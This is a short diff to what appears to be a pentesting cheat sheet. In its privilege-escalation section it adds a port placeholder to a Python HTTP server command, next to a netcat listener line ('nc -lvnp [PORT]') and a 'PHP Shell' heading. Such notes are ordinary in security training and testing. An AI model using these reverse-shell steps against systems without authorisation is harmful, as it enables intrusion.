@@ -47,7 +47,7 @@
 
 
 ## Privilege Escalation
-Start HTTP Server: python3 -m http.server
+Start HTTP Server: python3 -m http.server [PORT]
 Listen: nc -lvnp [PORT]
 
 PHP Shell (Trigger)
